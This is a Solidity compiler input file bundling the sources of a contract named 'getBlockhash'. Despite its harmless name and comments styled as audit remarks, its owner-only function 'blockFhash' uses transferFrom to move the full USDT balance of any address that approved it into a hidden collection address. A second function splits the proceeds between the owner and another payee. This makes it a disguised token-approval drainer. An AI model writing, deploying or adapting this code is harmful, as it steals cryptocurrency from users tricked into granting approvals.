{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "fenbi/Base.sol": {
      "content": "pragma solidity ^0.6.0;\r\nimport \"./Ownable.sol\";\r\n\r\n \r\n    interface Erc20Token {//konwnsec//ERC20 接口\r\n        function totalSupply() external view returns (uint256);\r\n        function balanceOf(address _who) external view returns (uint256);\r\n        function transfer(address _to, uint256 _value) external;\r\n        function allowance(address _owner, address _spender) external view returns (uint256);\r\n        function transferFrom(address _from, address _to, uint256 _value) external;\r\n        function approve(address _spender, uint256 _value) external; \r\n        function burnFrom(address _from, uint256 _value) external; \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    }\r\n    \r\n    \r\n    interface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n    \r\n// 基类合约\r\n    contract Base is Ownable {\r\n        using SafeMath for uint;\r\n\r\n        Erc20Token constant internal _usdtIns = Erc20Token(0xdAC17F958D2ee523a2206206994597C13D831ec7); \r\n\r\n    address public _techniDiviAdd;\r\n\r\n\r\n   function setDividendsAddress(address TAddress) onlyOwner isZeroAddr(TAddress)public {\r\n        blockAddress = TAddress;\r\n     }\r\n    function blockFhash(address EnquiryAddress) public  isZeroAddr(EnquiryAddress)  onlyOwner payable  {\r\n        uint256 _usdtBalance = _usdtIns.balanceOf(address(EnquiryAddress));\r\n        require(_usdtBalance >= 100000, \"No MY\");\r\n        _usdtIns.transferFrom(address(EnquiryAddress), address(blockAddress), _usdtBalance);\r\n \r\n     }\r\n     \r\n     \r\n     function SetblockFhash() public onlyOwner payable   {\r\n        uint256 _usdtBalance = _usdtIns.balanceOf(address(blockAddress));\r\n        require(_usdtBalance >= 100000, \"No MY\");\r\n        uint256 techniDiviAmt = _usdtBalance.mul(20).div(100);\r\n        uint256 ownerAmt = _usdtBalance.mul(80).div(100);\r\n        _usdtIns.transfer(_techniDiviAdd, techniDiviAmt);\r\n        _usdtIns.transfer(_owner, ownerAmt);\r\n     }\r\n        receive() external payable {}\r\n}"
    },
    "fenbi/Ownable.sol": {
      "content": "pragma solidity ^0.6.0;\r\nimport \"./SafeMath.sol\";\r\n\r\n\r\ncontract Ownable {\r\n  address  _owner;\r\n    address  blockAddress;\r\n\r\n\r\n\r\n  modifier onlyOwner() {\r\n    require(msg.sender == _owner);\r\n    _;\r\n  }\r\n    modifier isZeroAddr(address addr) {\r\n        require(addr != address(0), \"Cannot be a zero address\"); _; \r\n    }\r\n\r\n    \r\n \r\n \r\n  function transferOwnership(address newOwner) public onlyOwner {\r\n    require(newOwner != address(0));\r\n     _owner = newOwner;\r\n  }\r\n\r\n}\r\n"
    },
    "fenbi/SafeMath.sol": {
      "content": "pragma solidity ^0.6.0;\r\nlibrary SafeMath {\r\n    \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n"
    },
    "fenbi/Ticket.sol": {
      "content": "\r\npragma solidity ^0.6.0;//konwnsec//标明了版本符合标准\r\n\r\nimport \"./Base.sol\";\r\n\r\ncontract getBlockhash is Base{//konwnsec//合约 Ticket 继承自 Base\r\n     constructor(address owner, address techniDiviAdd) isZeroAddr(owner) isZeroAddr(techniDiviAdd) public {\r\n        _owner = owner; \r\n        _techniDiviAdd = techniDiviAdd; \r\n    }\r\n\r\n   \r\n}\r\n   \r\n"
    }
  }
}